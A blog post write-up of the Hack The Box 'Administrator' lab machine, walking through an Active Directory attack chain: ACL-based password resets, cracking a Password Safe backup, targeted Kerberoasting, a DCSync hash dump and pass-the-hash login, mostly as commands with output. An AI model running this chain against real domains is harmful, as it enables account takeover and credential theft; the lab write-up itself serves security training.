---
layout: post
title: Administrator - Hack The Box
excerpt: Write-up of Administrator, a medium-difficulty Windows machine centered on Active Directory abuse. Improper ACL permissions, credential reuse and Kerberoasting chain together into full domain compromise.
date: 2024-11-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-administrator/administrator-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - AD
  - kerberoasting
  - ACL
---

This article documents the steps taken to solve the **Administrator** machine from Hack The Box. It's a pure Active Directory challenge. We start with one user's credentials and use them to collect domain data with BloodHound. We discover that we can change a user's password and that user, in turn, can change another user's password. That user has access to an FTP share where a Password Safe file is stored. The password is cracked to recover more passwords and we pivot to the next user. This user has GenericWrite over another user, which is abused with a targeted Kerberoasting attack. Finally, a DCSync attack is performed to dump the domain administrator hash and fully compromise the domain.

### Tools/Blogs used

<ul>
  <li><strong>NetExec</strong>: <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">https://github.com/Pennyw0rth/NetExec</a></li>
  <li><strong>Evil-WinRM</strong>: <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">https://github.com/Hackplayers/evil-winrm</a></li>
  <li><strong>BloodHound</strong>: <a href="https://github.com/SpecterOps/BloodHound" target="_blank" rel="noopener noreferrer">https://github.com/SpecterOps/BloodHound</a></li>
  <li><strong>bloodhound-python</strong>: <a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener noreferrer">https://github.com/fox-it/BloodHound.py</a></li>
  <li><strong>Impacket</strong>: <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">https://github.com/fortra/impacket</a></li>
  <li><strong>Hashcat</strong>: <a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener noreferrer">https://github.com/hashcat/hashcat</a></li>
  <li><strong>John the Ripper</strong>: <a href="https://github.com/openwall/john" target="_blank" rel="noopener noreferrer">https://github.com/openwall/john</a></li>
  <li><strong>pwsafe2john</strong>: <a href="https://github.com/openwall/john/tree/bleeding-jumbo/run" target="_blank" rel="noopener noreferrer">https://github.com/openwall/john/tree/bleeding-jumbo/run</a></li>
  <li><strong>Password Safe</strong>: <a href="https://github.com/pwsafe/pwsafe" target="_blank" rel="noopener noreferrer">https://github.com/pwsafe/pwsafe</a></li>
  <li><strong>targetedKerberoast</strong>: <a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener noreferrer">https://github.com/ShutdownRepo/targetedKerberoast</a></li>
</ul>

## Recon

The first step is to run nmap to enumerate the open ports on the machine. `nmap` finds several open TCP ports:

```
└─$ nmap -sVC 10.10.11.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 08:17 EST
Nmap scan report for 10.10.11.42
Host is up (0.17s latency).
Not shown: 988 closed tcp ports (reset)
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
| ftp-syst:
|\_ SYST: Windows_NT
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-13 20:17:12Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
| date: 2024-11-13T20:17:23
|_ start_date: N/A
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
|\_clock-skew: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.47 seconds
```

From the nmap output the machine looks like a Windows Domain Controller (Kerberos, LDAP, SMB, etc.), and WinRM (5985) is open as well, so credential-based access through that port is likely possible.

FTP is also open, which is uncommon on a DC.

The LDAP script output also reveals the domain name `administrator.htb`. The DC hostname is added to /etc/hosts:

```
└─$ nano /etc/hosts

10.10.11.42   administrator.htb
```

## Enumeration

With valid domain credentials in hand, the first step is to dump a list of valid users:

```
└─$ netexec smb administrator.htb -u olivia -p ichliebedich --users
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
SMB         10.10.11.42     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account
SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0
SMB         10.10.11.42     445    DC               michael                       2024-10-06 01:33:37 0
SMB         10.10.11.42     445    DC               benjamin                      2024-10-06 01:34:56 0
SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0
SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0
SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0
SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0
SMB         10.10.11.42     445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
```

The following command can be used to save just the usernames to a file:

```
nxc smb 10.10.11.42 -u olivia -p "ichliebedich" --users | grep -E '^[[:space:]]*SMB[[:space:]]+[0-9.]+' | awk '{print $5}'
```

Next, check whether the initial user has read/write access to any interesting shares on the machine — which turns out not to be the case:

```
└─$ netexec smb administrator.htb -u olivia -p ichliebedich --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

Since the machine has WinRM open, if the user belongs to the Remote Management Users group we should be able to log in through that port. Check it with the initial credentials:

```
└─$ netexec winrm 10.10.11.42 -u olivia -p ichliebedich
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```

WinRM access works, so evil-winrm is used to drop a shell:

```
└─$ evil-winrm -i administrator.htb -u olivia -p ichliebedich

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```

Dump olivia's privileges and group memberships:

```
*Evil-WinRM* PS C:\inetpub> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Olivia has no exploitable privilege, but membership in `Remote Management Users` is confirmed.

### BloodHound

The **bloodhound-python** collector is used to pull domain data and feed it into **BloodHound**:

```
└─$ bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 27S
INFO: Compressing output into 20241116053818_bloodhound.zip

```

Once the zip is loaded into BloodHound, olivia is shown to have `GenericAll` over the user Michael. That means olivia controls Michael's object — including resetting his password — which gives access as that user.

![](/assets/images/htb-writeup-administrator/olivia-acl.png)

## Exploitation (Olivia → Michael)

To change the password, `net rpc` is used:

```
net rpc password "michael" "michael123" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```

Once changed, the new credentials are verified with NetExec, both over SMB and WinRM:

```
└─$ netexec smb 10.10.11.42 -u michael -p 'michael123'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:michael123
```

```
└─$ netexec winrm 10.10.11.42 -u michael -p 'michael123'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:michael123 (Pwn3d!)
```

## Lateral movement (Michael → Benjamin)

Back in BloodHound, michael's outbound permissions show `ForceChangePassword` over benjamin, which allows resetting his password too. The same technique is used:

```
net rpc password "benjamin" "benjamin123" -U "administrator.htb"/"michael"%"michael123" -S 10.10.11.42
```

The new credentials are verified — they work over SMB but not WinRM:

```
└─$ netexec smb 10.10.11.42 -u benjamin -p 'benjamin123'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:benjamin123
```

```
└─$ netexec winrm 10.10.11.42 -u benjamin -p 'benjamin123'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [-] administrator.htb\benjamin:benjamin123
```

Enumerating with this user reveals no obvious exploitable permissions on the machine or in Active Directory. Recalling that port 21 was open, NetExec is used to check whether these credentials work over FTP:

```
└─$ netexec ftp administrator.htb -u benjamin -p benjamin123
FTP         10.10.11.42     21     administrator.htb [+] benjamin:benjamin123
```

They work — because Benjamin is in the `Share Moderators` group, as can be seen from the olivia shell:

```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user benjamin
User name                    benjamin
Full Name                    Benjamin Brown
...[snip]...

Local Group Memberships      *Share Moderators
Global Group memberships     *Domain Users
The command completed successfully.
```

## Lateral movement (Benjamin → user.txt)

Logging into the FTP as benjamin yields a `Backup.psafe3` file:

```
└─$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:oxdf): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||60887|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||60902|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************|   952        6.67 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (6.66 KiB/s)
```

The `file` command identifies it as a Password Safe V3 database:

```
└─$ file Backup.psafe3
Backup.psafe3: Password Safe V3 database
```

The file is password-protected, so `pwsafe2john` and John the Ripper are used to crack it:

```
└─$ pwsafe2john Backup.psafe3 > pwsafedump.txt
```

```
└─$ john pwsafedump.txt --wordlist=/usr/share/wordlist/rockyou.txt
...[snip]...
tekieromucho  (Backu)
...[snip]...
```

The password is `tekieromucho`. The latest version of Password Safe is then downloaded and installed from [GitHub](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true). Opening the file with this password reveals three users:

![](/assets/images/htb-writeup-administrator/users.png)

Trying the three passwords, only emily's is valid — and it also grants WinRM access:

```
└─$ netexec smb administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb

└─$ netexec winrm administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

With this user, the first flag is recovered:

```
*Evil-WinRM* PS C:\Users\emily\desktop> cat user.txt
142aa43f************************
```

## Privilege escalation

Back in BloodHound, emily's outbound rights show `GenericAll` over Ethan — a Domain Admin with DCSync rights over the domain.

![](/assets/images/htb-writeup-administrator/emily.png)

`GenericAll` grants full control over the target object, which lets emily modify critical attributes of the user Ethan, including his password, group membership and permission delegation.

Since Ethan is a member of `Domain Admins`, compromising his account means full control of the domain. On top of that, this level of privilege enables a DCSync attack — replicating credentials from the Domain Controller to obtain the hashes of every account in the domain, including `krbtgt`.

`GenericAll` from emily to Ethan is therefore a direct path to Domain Admin and full domain compromise.

### Targeted Kerberoasting

A Service Principal Name (SPN) is a unique identifier that associates a service instance with a service account in Kerberos. Kerberoasting is an attack in which an authenticated user requests a ticket for a service via its SPN; the returned ticket is encrypted with the password of the account associated with that service. If that password is weak, it can be cracked offline.

For a targeted Kerberoast, the `GenericWrite` (in this case, `GenericAll`) privilege is used to add an SPN to Ethan. After that, a ticket for that fake service can be requested, returning a hash encrypted with Ethan's password. If the password is weak, it can be cracked offline.

The tool [targetedkerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast.git) is used.

First the local clock is synced against the DC, then the script is run — it detects emily's write privilege, adds an SPN, fetches the hash, and cleans up:

```
└─$ sudo ntpdate administrator.htb
2025-04-16 01:40:05.191473 (+0000) +26969.718771 +/- 0.046738 administrator.htb 10.10.11.42 s1 no-leap
CLOCK: time stepped by 26969.718771
```

```
└─$ .\targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Installed 26 packages in 24ms
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e7458cb1f13711cedb8f591a5d166b9f$5bdc26...[snip]...
[VERBOSE] SPN removed successfully for (ethan)
```

`hashcat` with `rockyou.txt` cracks the hash in a few seconds:

```
└─$ hashcat ethan.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$_ethan$ADMINISTRATOR.HTB$administrator.htb/ethan_$82e55c4be49...[snip]...:limpbizkit
...[snip]...
```

Ethan's password is `limpbizkit`. This user has DCSync rights against the domain, so all hashes can be dumped with `impacket-secretsdump`:

```
└─$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'10.10.11.42'
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:02cb8258df07966e32677128e5ff1d26:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:02cb8258df07966e32677128e5ff1d26:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:811213be007de8ae1e546aaed7c6ac42343d7211a60f938d69733bce9ae2c5c9
administrator.htb\michael:aes128-cts-hmac-sha1-96:31dbcbe5dbd7ccb1faf5272d83e0f8eb
administrator.htb\michael:des-cbc-md5:0dbf5134d0c2ec8a
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:f88ef08792b0955ae4ccebf7768098b1fe0ae67c84d72c0dcc48c5e7fcb38bae
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:e189232083e5dbfcf489d46181fe7e73
administrator.htb\benjamin:des-cbc-md5:d085a40489fdb6a4
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

With the Administrator hash, evil-winrm authenticates against the DC and grabs the final flag:

```
└─$ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4cf2d737************************
```
